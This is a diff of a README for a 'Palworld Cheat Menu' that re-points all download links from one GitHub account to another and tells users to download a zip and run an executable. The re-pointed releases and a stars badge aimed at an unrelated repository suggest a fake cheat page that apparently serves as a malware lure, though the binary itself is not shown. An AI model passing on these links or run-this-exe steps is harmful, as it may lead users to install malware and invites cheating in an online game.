@@ -1,7 +1,7 @@
 # Palworld Cheat Menu (Upd: 28.08.26)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/MergeDagger75/palworld-mod-hack/releases/download/1.1/Palworld_build-1.1.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/MergeDagger75/palworld-mod-hack/releases/download/1.1/Palworld_build-1.1.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/Clipaevalley/palworld-mod-hack/releases/download/v1/Palworld_build-1.1.0.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/Clipaevalley/palworld-mod-hack/releases/download/v1/Palworld_build-1.1.0.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/marwan-at-work/mod?style=for-the-badge&logo=github)](https://github.com/Clipaevalley/palworld-mod-hack/stargazers)
 
@@ -47,10 +47,10 @@
 ---
 
 ## How to use
-1. Download the [latest release build](https://github.com/MergeDagger75/palworld-mod-hack/releases/download/1.1/Palworld_build-1.1.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/Clipaevalley/palworld-mod-hack/releases/download/v1/Palworld_build-1.1.0.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\Palworldhakken` or Desktop).
 3. Launch game.
-4. Run `PalMod-git-1.1.exe`.
+4. Run `PalMod-git-1.1.0.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
@@ -73,4 +73,4 @@ Simply delete the extracted folder. There are no registry changes or leftover fi
 
 
 
-[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/MergeDagger75/palworld-mod-hack)
+[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/Clipaevalley/palworld-mod-hack)
